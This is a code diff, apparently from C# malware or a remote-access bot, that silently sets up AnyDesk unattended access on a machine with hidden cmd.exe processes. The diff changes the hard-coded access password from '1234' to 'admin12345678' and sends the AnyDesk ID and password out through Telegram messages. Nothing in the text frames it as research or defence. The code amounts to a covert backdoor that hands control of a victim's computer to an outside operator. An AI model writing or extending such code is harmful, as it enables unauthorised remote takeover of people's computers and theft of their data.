@@ -156,7 +156,7 @@ ad.roaming.allow_incoming=1
                     TelegramInstance?.SendMessage(
                         $"✅ <b>AnyDesk Ready!</b>\n" +
                         $"🆔 <b>ID:</b> <code>{_anydeskId}</code>\n" +
-                        $"🔑 <b>Password:</b> <code>1234</code>\n" +
+                        $"🔑 <b>Password:</b> <code>admin12345678</code>\n" +
                         $"🛡️ <i>Config Pre-seeded</i>"
                     );
                 }
@@ -261,7 +261,7 @@ ad.roaming.allow_incoming=1
                 var psi = new ProcessStartInfo
                 {
                     FileName = "cmd.exe",
-                    Arguments = $"/c echo 1234 | \"{anydeskExe}\" --set-password",
+                    Arguments = $"/c echo admin12345678 | \"{anydeskExe}\" --set-password",
                     CreateNoWindow = true,
                     UseShellExecute = false,
                     WindowStyle = ProcessWindowStyle.Hidden
@@ -273,7 +273,7 @@ ad.roaming.allow_incoming=1
                  Process.Start(new ProcessStartInfo
                 {
                     FileName = anydeskExe,
-                    Arguments = "--set-password 1234",
+                    Arguments = "--set-password admin12345678",
                     CreateNoWindow = true,
                     UseShellExecute = false,
                     WindowStyle = ProcessWindowStyle.Hidden
@@ -339,7 +339,7 @@ ad.roaming.allow_incoming=1
                     TelegramInstance?.SendMessage(
                         $"✅ <b>AnyDesk Running (Unattended)</b>\n" +
                         $"🆔 <b>ID:</b> <code>{_anydeskId}</code>\n" +
-                        $"� <b>Password:</b> <i>None</i>"
+                        $"🔑 <b>Password:</b> <code>admin12345678</code>"
                     );
                 }
                 else
@@ -371,7 +371,7 @@ ad.roaming.allow_incoming=1
                 {
                     TelegramInstance?.SendMessage(
                         $"🆔 <b>AnyDesk ID:</b> <code>{_anydeskId}</code>\n" +
-                        $"� <b>Password:</b> <i>None (Unattended Access)</i>"
+                        $"🔑 <b>Password:</b> <code>admin12345678</code>"
                     );
                 }
                 else
